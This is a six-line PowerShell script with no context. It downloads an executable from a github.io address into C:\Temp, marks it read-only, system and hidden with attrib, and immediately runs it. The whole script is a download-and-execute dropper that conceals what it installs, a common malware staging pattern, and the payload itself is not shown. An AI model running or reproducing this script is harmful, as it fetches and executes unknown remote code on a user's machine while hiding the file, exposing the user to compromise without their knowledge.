Set-Location C:\Temp\
$URL = "xzprojects.github.io/ps/wins/gay.exe"
$Path = "C:\Temp\gay.exe"
Invoke-WebRequest -URI $URL -OutFile $Path
attrib.exe +r +s +h gay.exe
.\gay.exe